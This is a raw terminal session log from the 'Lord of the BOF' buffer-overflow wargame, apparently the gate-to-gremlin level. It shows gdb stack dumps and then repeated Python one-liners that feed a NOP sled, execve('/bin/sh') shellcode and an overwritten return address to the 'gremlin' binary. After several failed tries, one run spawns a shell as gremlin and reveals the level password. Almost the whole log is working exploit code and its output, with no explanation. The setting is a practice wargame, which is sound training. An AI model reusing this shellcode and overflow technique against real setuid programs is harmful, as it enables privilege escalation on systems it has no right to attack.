0xbffffc2c:	0x90	0x90	0x90	0x90	0x90	0x31	0xc0	0x50
0xbffffc34:	0x68	0x2f	0x2f	0x73	0x68	0x68	0x2f	0x62
0xbffffc3c:	0x69	0x6e	0x89	0xe3
(gdb) 
0xbffffc40:	0x50	0x53	0x89	0xe1	0x89	0xc2	0xb0	0x0b
0xbffffc48:	0xcd	0x80	0xff	0xff	0xff	0xbf	0x40	0xfc
0xbffffc50:	0xff	0xbf	0x00	0x50	0x57	0x44	0x3d	0x2f
0xbffffc58:	0x68	0x6f	0x6d	0x65	0x2f	0x67	0x61	0x74
0xbffffc60:	0x65	0x00	0x52	0x45	0x4d	0x4f	0x54	0x45
0xbffffc68:	0x48	0x4f	0x53	0x54	0x3d	0x31	0x39	0x32
0xbffffc70:	0x2e	0x31	0x36	0x38	0x2e	0x32	0x33	0x35
0xbffffc78:	0x2e	0x31	0x00	0x48	0x4f	0x53	0x54	0x4e
0xbffffc80:	0x41	0x4d	0x45	0x3d	0x6c	0x6f	0x63	0x61
0xbffffc88:	0x6c	0x68	0x6f	0x73	0x74	0x2e	0x6c	0x6f
0xbffffc90:	0x63	0x61	0x6c	0x64	0x6f	0x6d	0x61	0x69
0xbffffc98:	0x6e	0x00	0x4c	0x45	0x53	0x53	0x4f	0x50
0xbffffca0:	0x45	0x4e	0x3d	0x7c
(gdb) 
0xbffffca4:	0x2f	0x75	0x73	0x72	0x2f	0x62	0x69	0x6e
0xbffffcac:	0x2f	0x6c	0x65	0x73	0x73	0x70	0x69	0x70
0xbffffcb4:	0x65	0x2e	0x73	0x68	0x20	0x25	0x73	0x00
0xbffffcbc:	0x55	0x53	0x45	0x52	0x3d	0x67	0x61	0x74
0xbffffcc4:	0x65	0x00	0x4c	0x53	0x5f	0x43	0x4f	0x4c
0xbffffccc:	0x4f	0x52	0x53	0x3d	0x6e	0x6f	0x3d	0x30
0xbffffcd4:	0x30	0x3a	0x66	0x69	0x3d	0x30	0x30	0x3a
0xbffffcdc:	0x64	0x69	0x3d	0x30	0x31	0x3b	0x33	0x34
0xbffffce4:	0x3a	0x6c	0x6e	0x3d	0x30	0x31	0x3b	0x33
0xbffffcec:	0x36	0x3a	0x70	0x69	0x3d	0x34	0x30	0x3b
0xbffffcf4:	0x33	0x33	0x3a	0x73	0x6f	0x3d	0x30	0x31
0xbffffcfc:	0x3b	0x33	0x35	0x3a	0x62	0x64	0x3d	0x34
0xbffffd04:	0x30	0x3b	0x33	0x33
(gdb) 
0xbffffd08:	0x3b	0x30	0x31	0x3a	0x63	0x64	0x3d	0x34
0xbffffd10:	0x30	0x3b	0x33	0x33	0x3b	0x30	0x31	0x3a
0xbffffd18:	0x6f	0x72	0x3d	0x30	0x31	0x3b	0x30	0x35
0xbffffd20:	0x3b	0x33	0x37	0x3b	0x34	0x31	0x3a	0x6d
0xbffffd28:	0x69	0x3d	0x30	0x31	0x3b	0x30	0x35	0x3b
0xbffffd30:	0x33	0x37	0x3b	0x34	0x31	0x3a	0x65	0x78
0xbffffd38:	0x3d	0x30	0x31	0x3b	0x33	0x32	0x3a	0x2a
0xbffffd40:	0x2e	0x63	0x6d	0x64	0x3d	0x30	0x31	0x3b
0xbffffd48:	0x33	0x32	0x3a	0x2a	0x2e	0x65	0x78	0x65
0xbffffd50:	0x3d	0x30	0x31	0x3b	0x33	0x32	0x3a	0x2a
0xbffffd58:	0x2e	0x63	0x6f	0x6d	0x3d	0x30	0x31	0x3b
0xbffffd60:	0x33	0x32	0x3a	0x2a	0x2e	0x62	0x74	0x6d
0xbffffd68:	0x3d	0x30	0x31	0x3b
(gdb) q
[gate@localhost gate]$ ./gremlim `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\xa0\xfb\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿ 
bash$ ls
asdf  asdf.c  core  gremlim  gremlin  gremlin.c  temp
bash$ id
uid=500(gate) gid=500(gate) groups=500(gate)
bash$ pass
sh: pass: command not found
bash$ passwd
Changing password for gate
(current) UNIX password: 

bash$ mypass
sh: mypass: command not found
bash$ my-pass
euid = 500
I dunno
bash$ q
sh: q: command not found
bash$ exit
exit
[gate@localhost gate]$ exot
bash2: exot: command not found
[gate@localhost gate]$ exit
exit
[gate@localhost temp]$ exit
logout
Connection closing...Socket close.

Connection closed by foreign host.

Disconnected from remote host(LOB) at 18:52:56.

Type `help' to learn how to use Xshell prompt.
[C:\~]$ 

Connecting to 192.168.235.128:23...
Connection established.
To escape to local shell, press Ctrl+Alt+].
                                            _______________________
  _______________________-------------------                       `\
 /:--__                                                              |
||< > |                                   ___________________________/
| \__/_________________-------------------                         |
|                                                                  |
 |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
 |                                                                  |
 |                                                                  |
  |       [enter to the dungeon]                                    |
  |       gate : gate                                                |
  |                                                                  |
  |       [RULE]                                                     |
   |      - do not use local root exploit                             |
   |      - do not use LD_PRELOAD to my-pass                          |
   |      - do not use single boot                    [h4ck3rsch001] |
  |                                              ____________________|_
  |  ___________________-------------------------                      `\
  |/`--_                                                                 |
  ||[ ]||                                            ___________________/
   \===/___________________-------------------------- 


login: gremlin
Password: 
Login incorrect

login: q^H^H^H
Password: 
Login incorrect

login: gate
Password: 
Last login: Sat Aug 11 08:16:49 from 192.168.235.1
[gate@localhost gate]$ ls
asdf  asdf.c  core  gremlim  gremlin  gremlin.c  temp
[gate@localhost gate]$ bash2
[gate@localhost gate]$ exit
exit
[gate@localhost gate]$ bash2
[gate@localhost gate]$ `python -c 'print "0x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
bash2: 0x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x901󿿐h//shh/bin⏓ኂ°
                                                                                                              ̀ÿÿÿ¿8󽸠File name too long
[gate@localhost gate]$ `python -c 'print "x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
bash2: x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x901󿿐h//shh/bin⏓ኂ°
                                                                                        ̀ÿÿÿ¿8󽸠File name too long
[gate@localhost gate]$ `python -c 'print "x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
bash2: x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x901󿿐h//shh/bin⏓ኂ°
                                                                                        ̀ÿÿÿ¿8󽸠File name too long
[gate@localhost gate]$ ext
bash2: ext: command not found
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿8
Segmentation fault
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\xa0\xfb\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿ 
bash$ whoami
gremlin
bash$ my-pass
euid = 501
hello bof world
bash$ q
sh: q: command not found
bash$ exit
exit
[gate@localhost gate]$ exit
exit
[gate@localhost gate]$ exit
logout
Connection closing...Socket close.

Connection closed by foreign host.

Disconnected from remote host(LOB) at 19:02:20.

Type `help' to learn how to use Xshell prompt.
[C:\~]$ 